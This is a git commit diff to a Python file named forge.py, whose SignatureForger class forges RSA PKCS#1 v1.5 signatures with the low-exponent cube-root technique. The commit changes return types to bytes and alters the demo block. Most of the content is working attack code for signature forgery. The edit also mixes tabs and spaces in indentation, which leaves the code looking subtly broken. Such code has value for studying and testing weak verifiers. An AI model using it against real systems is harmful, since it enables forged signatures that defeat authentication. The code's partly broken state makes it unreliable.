8e972838e57572d12d8298c3e682ae39025d2636
hoeg <peter.steffensen@gmail.com>
2017-06-29 20:28:35 +0000

    changed type of the returned calculated suffix to bytes

--- forge.py
+++ forge.py
@@ -33,7 +33,6 @@ class SignatureForger:
 		self.hashAlg = hashAlg
 		self.method = method
 
-
 	def encodePkcs1Suffix(self, message):
 		messageHash = self.hashAlg.digester(message).digest()
 		if ord(messageHash[-1]) & 0x01 != 0x01:
@@ -47,16 +46,16 @@ class SignatureForger:
 		for idx in range(len(suffix) * 8):
 			if getBitAt(idx, signatureSuffix ** 3) != getBitAt(idx, toInt(suffix)):
 				signatureSuffix = setBitAt(idx, signatureSuffix)
-		return signatureSuffix
+		return toBytes(signatureSuffix)
 
 	def addPrefixToSignature(self, signatureSuffix):
 		prefix = "\x00\x01"
 		prefix += "\xFF"*8
 		while True:
 			testPrefix = prefix + os.urandom((self.keysize/8) - (len(prefix)))
-			signatureCandidate = toBytes(int(gmpy2.cbrt(toInt(testPrefix))))[:-len(toBytes(signatureSuffix))] + toBytes(signatureSuffix)
+			signatureCandidate = toBytes(int(gmpy2.cbrt(toInt(testPrefix))))[:-len(signatureSuffix)] + signatureSuffix
 			toCheck = toBytes(toInt(signatureCandidate) ** 3)
-			if "\x00" not in toCheck[:-len(toBytes(signatureSuffix))]:
+			if "\x00" not in toCheck[:-len(signatureSuffix)]:
 				return signatureCandidate
 
 
@@ -66,7 +65,6 @@ class SignatureForger:
 		signature = self.addPrefixToSignature(signatureSuffix)
 		return signature
 
- 
 	def nthroot (self, n, A, precision=300):
 	    getcontext().prec = precision
 	 
@@ -84,19 +82,20 @@ class SignatureForger:
 		prefix += "\xFF"*psLength
 		suffix = self.encodePkcs1Suffix(message)
 		plain = prefix + suffix + "\x00"*((self.keysize/8)-(len(prefix) + len(suffix)))
-		signature = toBytes(int(self.nthroot(3, toInt(plain)))+1)
+    signature = toBytes(int(self.nthroot(3, toInt(plain)))+1)
 		return signature
 
 if __name__ == "__main__":
-	message = "WhAAASDAatWhatInTheButt"
-	signatureForger = SignatureForger(2048, Hash("SHA-1"), 1)
-	#signature = signatureForger.forgeSignature_method1(message)
-	signature = signatureForger.forgeSignature_method2(message)
-	print(hex(toInt(signature) ** 3))
-	'''
-	output format: raw, hex, base64
-	keysize: raw, from public key
-	hash algo, md5, sha1, sha256, sha384, sha512
-	message to sign: ascii, hex, base64
-	'''
+  message = "WhAAASDAatWhatInTheButt"
+  signatureForger = SignatureForger(1024, Hash("SHA-1"), 1)
+  #signature = signatureForger.forgeSignature_method1(message)
+  signature = signatureForger.forgeSignature_method2(message)
+  print(hex(toInt(signature) ** 3))
+	
+'''
+output format: raw, hex, base64
+keysize: raw, from public key
+hash algo, md5, sha1, sha256, sha384, sha512
+message to sign: ascii, hex, base64
+'''
 
